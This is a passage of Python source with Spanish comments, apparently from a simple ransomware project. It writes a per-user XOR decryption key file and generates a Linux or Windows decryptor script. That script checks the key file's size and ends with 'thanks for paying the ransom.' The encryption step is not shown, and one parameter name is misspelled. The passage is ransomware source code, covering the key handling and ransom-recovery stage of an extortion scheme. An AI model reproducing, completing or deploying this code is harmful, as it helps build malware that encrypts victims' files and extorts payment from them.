# crea el archvio llave de descifrado 
def create_keyfile(tokenized_dict,user):
    with open(f"{user}_decryption_key.py",'w') as file:
        file.write(f"{user}decipher_key = "+"{")
        for filename,key in tokenized_dict.items():                                
            file.write(f"'{filename}':'{key}',")
        file.write("}")
    file.close()
    size = os.path.getsize(f"{current}/{user}_decryption_key.py")
    return size
# crea el archivo 'key' y devuelve el tamano del archivo key como integer
key_size = create_keyfile(tokenized_dict,user)
#print(type(key_size))

# funcion para crear el programa de descifrado singular 
def custom_decipher_file(current,key_size,user,sysnifo):
    with open("XORDECIPHER.py",'w') as file:
        if sysinfo[0] == "Linux":
            file.write(f"""

import {user}_decryption_key
import time
import os 
print("WELCOME TO XORCIPHER DECRYPTION PROGRAM")
time.sleep(1)
print("PROCEED AUTO DECRYPTION")
time.sleep(1)
# variable global = diccionario de claves
solution = {user}_decryption_key.{user}decipher_key

# funcion de desencriptar
def decryptor(solution):
    try:                                                                        
        for filename, key in solution.items():
            with open(filename,'rb') as file:
                encrypted_data = file.read()
            key_bytes = bytearray(key,'utf-8')
            decrypted_data = bytearray()
            for i,byte in enumerate(encrypted_data):
                decrypted_data.append(byte ^ key_bytes [i % len(key_bytes)])
            with open(filename,'wb') as sfile:
                sfile.write(decrypted_data)
                print("-- Decrypting Data --")
    except FileNotFoundError:
        print("ERRROR Decrypting > Files does not exist")


# funcion para corroborar el archivo 'key', si lo es procede a desencriptarlo
# caso contrario, no lo desencripta.

def check_keyfile():
    keyfile = f"{current}/{user}_decryption_key.py"
    size = os.path.getsize(keyfile)
    if size == {key_size}:
        print("Is the UNIQUE file")
        print("Proceed decryption")
        decryptor(solution)
        print("YOUR files are RECOVERED")
        time.sleep(1)
        print("Bye, thanks for paying the ransom.")
        time.sleep(1)
    else:
        print("Is not the UNIQUE file, cannot decrypt, ending program...")
        
check_keyfile()

""")
            file.close()
        elif sysinfo[0] == "Windows":
            file.write(f"""
        
import {user}_decryption_key
import time
import os 
print("WELCOME TO XORCIPHER DECRYPTION PROGRAM")
time.sleep(1)
print("PROCEED AUTO DECRYPTION")
time.sleep(1)
# variable global = diccionario de claves
solution = {user}_decryption_key.{user}decipher_key

# funcion de desencriptar
def decryptor(solution):
    try:                                                                        
        for filename, key in solution.items():
            with open(filename,'rb') as file:
                encrypted_data = file.read()
            key_bytes = bytearray(key,'utf-8')
            decrypted_data = bytearray()
            for i,byte in enumerate(encrypted_data):
                decrypted_data.append(byte ^ key_bytes [i % len(key_bytes)])
            with open(filename,'wb') as sfile:
                sfile.write(decrypted_data)
                print("-- Decrypting Data --")
    except FileNotFoundError:
        print("ERRROR Decrypting > Files does not exist")


# funcion para corroborar el archivo 'key', si lo es procede a desencriptarlo
# caso contrario, no lo desencripta.

def check_keyfile():
    keyfile = r"{current}\{user}_decryption_key.py"


    size = os.path.getsize(keyfile)
    if size == {key_size}:
        print("Is the UNIQUE file")
        print("Proceed decryption")
        decryptor(solution)
        print("YOUR files are RECOVERED")
        time.sleep(1)
        print("Bye, thanks for paying the ransom.")
        time.sleep(1)
    else:
        print("Is not the UNIQUE file, cannot decrypt, ending program...")
        
check_keyfile()

""")
            file.close()
    
    

# crea el programa de descifrado'xordecipher.py'
custom_decipher_file(current,key_size,user,sysinfo)